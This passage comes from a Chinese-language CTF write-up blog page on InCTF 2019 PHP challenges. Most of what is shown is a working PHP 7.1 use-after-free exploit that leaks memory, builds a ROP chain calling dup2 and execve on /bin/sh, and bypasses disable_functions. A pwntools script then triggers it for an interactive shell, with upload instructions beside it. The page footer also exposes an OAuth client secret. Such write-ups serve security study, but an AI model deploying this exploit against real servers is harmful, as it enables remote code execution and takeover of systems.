<span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">      $i = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">        $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">        $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span><span class="params">(&amp;$str, $p, $s=<span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span><span class="params">($ptr, $m=<span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $out = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rop</span><span class="params">($addr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $ctr;</span><br><span class="line">        <span class="comment"># rop starts at abc + 0x1010</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x1010</span> + $ctr * <span class="number">8</span>, $addr);</span><br><span class="line">        $ctr += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">syscall</span><span class="params">($syscall_no, $rdi=<span class="number">0</span>, $rsi=<span class="number">0</span>, $rdx=<span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rop(<span class="keyword">$this</span>-&gt;rebase(POP_RDI));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rop($syscall_no);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rop(<span class="keyword">$this</span>-&gt;rebase(POP_RSI));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rop($rdi);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rop(<span class="keyword">$this</span>-&gt;rebase(POP_RDX));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rop($rsi);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rop(<span class="keyword">$this</span>-&gt;rebase(POP_RCX));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rop($rdx);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rop(<span class="keyword">$this</span>-&gt;rebase(SYSCALL_PLT));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">jsonSerialize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $y, $pie, $ctr;</span><br><span class="line"></span><br><span class="line">        $contiguous = [];</span><br><span class="line">        <span class="keyword">for</span>($i=<span class="number">0</span>; $i &lt; <span class="number">10</span>; $i++)</span><br><span class="line">            $contiguous[] = <span class="keyword">new</span> DateInterval(<span class="string">'PT1S'</span>);</span><br><span class="line">        $room = [];</span><br><span class="line">        <span class="keyword">for</span>($i=<span class="number">0</span>; $i &lt; <span class="number">10</span>;$i++)</span><br><span class="line">            $room[] = <span class="keyword">new</span> Z();</span><br><span class="line">        $_protector = <span class="keyword">$this</span>-&gt;ptr2str(<span class="number">0</span>, <span class="number">78</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;abc = <span class="keyword">$this</span>-&gt;ptr2str(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">        $p = <span class="keyword">new</span> DateInterval(<span class="string">'PT1S'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unset</span>($y[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">unset</span>($p);</span><br><span class="line">        $protector = <span class="string">".$_protector"</span>;</span><br><span class="line"></span><br><span class="line">        $x = <span class="keyword">new</span> DateInterval(<span class="string">'PT1S'</span>);</span><br><span class="line">        $x-&gt;d = <span class="number">0x2000</span>; <span class="comment"># $this-&gt;abc is now of size 0x2000</span></span><br><span class="line">  </span><br><span class="line">        $spl1 = <span class="keyword">new</span> MySplFixedArray();</span><br><span class="line">        $spl2 = <span class="keyword">new</span> MySplFixedArray();</span><br><span class="line"></span><br><span class="line">        <span class="comment"># some leaks</span></span><br><span class="line">        $class_entry = <span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x120</span>);</span><br><span class="line">        $handlers = <span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x128</span>);</span><br><span class="line">        $php_heap = <span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x1a8</span>);</span><br><span class="line">        $abc_addr = $php_heap - <span class="number">0x218</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># pie leak</span></span><br><span class="line">        $fake_obj = $abc_addr + <span class="number">0x60</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x68</span>, $handlers - <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x120</span>, $fake_obj);</span><br><span class="line">        $pie = <span class="keyword">$this</span>-&gt;str2ptr(get_class($spl1), <span class="number">8</span>) - ZEND_OBJECTS_DESTROY_OBJECT;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># write rop</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;syscall(<span class="number">33</span>, SOCK_FD, <span class="number">1</span>); <span class="comment"># dup2</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;syscall(<span class="number">33</span>, SOCK_FD, <span class="number">0</span>); <span class="comment"># dup2</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;syscall(<span class="number">59</span>, <span class="keyword">$this</span>-&gt;rebase(BIN_SH)); <span class="comment"># execve</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;syscall(<span class="number">60</span>, <span class="number">0</span>); <span class="comment"># exit</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># overwrite next chunk forward pointer</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x1a8</span>, $class_entry + <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># allocate some strings</span></span><br><span class="line">        $x = str_repeat(<span class="string">"X"</span>, <span class="number">69</span>);</span><br><span class="line">        $y = str_repeat(<span class="string">"Y"</span>, <span class="number">69</span>);</span><br><span class="line">        $z = str_repeat(<span class="string">"Z"</span>, <span class="number">69</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># $z is now at $class_entry + 0x20</span></span><br><span class="line">        <span class="comment"># restore a pointer to some writable addr</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write($z, <span class="number">0</span>, $abc_addr); </span><br><span class="line"></span><br><span class="line">        <span class="comment"># overwrite a function destructor</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write($z, <span class="number">0x18</span>, $abc_addr + <span class="number">0x1000</span>); <span class="comment"># -&gt; rdi</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write($z, <span class="number">0x38</span>, <span class="keyword">$this</span>-&gt;rebase(STACK_PIVOT)); <span class="comment"># -&gt; rip</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(php_sapi_name() != <span class="string">'apache2handler'</span> ||</span><br><span class="line">    phpversion() != <span class="string">'7.1.32-1+ubuntu16.04.1+deb.sury.org+1'</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Wrong setup.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> $y;</span><br><span class="line">$y = [<span class="keyword">new</span> Z()];</span><br><span class="line">json_encode([<span class="number">0</span> =&gt; &amp;$y]);</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>上传该php文件到服务器</p>
+</li>
+<li><p>本地执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s = remote(<span class="string">'localhost'</span>, <span class="number">80</span>)</span><br><span class="line">p = <span class="string">'GET /pwn.php HTTP/1.1\r\n'</span></span><br><span class="line">p += <span class="string">'Host: localhost\r\n\r\n'</span></span><br><span class="line">s.send(p)</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>执行环境必须是<code>php 7.1.32-1+ubuntu16.04.1+deb.sury.org+1 + apache2</code></p>
+<p><img src="./1569483833588.png" alt="1569483833588"></p>
+</li>
+<li><p>py执行结果</p>
+<p>   <img src="./1569483928690.png" alt="1569483928690"></p>
+</li>
+</ol>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://fireshellsecurity.team/inctf2019-php1-php15-php25/" target="_blank" rel="noopener">https://fireshellsecurity.team/inctf2019-php1-php15-php25/</a></p>
+<p><a href="https://ctftime.org/writeup/16595" target="_blank" rel="noopener">https://ctftime.org/writeup/16595</a></p>
+<h1 id="特性总结"><a href="#特性总结" class="headerlink" title="特性总结"></a>特性总结</h1><ol>
+<li>php 对于ascii 0x7f默认为字符串</li>
+<li>eval、echo为语言结构不是函数</li>
+<li>eval的特性：只能执行一次代码</li>
+<li>rce参考一些常见的webshell思路</li>
+<li>_()为gettext()的别名</li>
+</ol>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#ctf" >
+    <span class="tag-code">ctf</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/09/22/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1-fafuscan/">
+        <span class="nav-arrow">← </span>
+        
+          课程设计 | fafuscan
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2019/09/25/vBulletin5-x%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/">
+        
+          vBulletin5-x前台代码执行漏洞(复现)
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#php1-0"><span class="toc-nav-text">php1.0</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#思路一：无字母webshell"><span class="toc-nav-text">思路一：无字母webshell</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#思路二：字符串拼接"><span class="toc-nav-text">思路二：字符串拼接</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#os命令执行"><span class="toc-nav-text">os命令执行</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#php1-5、php2-5"><span class="toc-nav-text">php1.5、php2.5</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#新增过滤"><span class="toc-nav-text">新增过滤</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#payload1"><span class="toc-nav-text">payload1</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#payload3-proc-open文件写到tmp"><span class="toc-nav-text">payload3(proc_open文件写到tmp)</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#php2-0"><span class="toc-nav-text">php2.0</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#EXP"><span class="toc-nav-text">EXP</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#参考链接"><span class="toc-nav-text">参考链接</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#特性总结"><span class="toc-nav-text">特性总结</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2019/09/24/Inctf-web题解/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "Inctf题解 | rce+disable_functions bypass",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
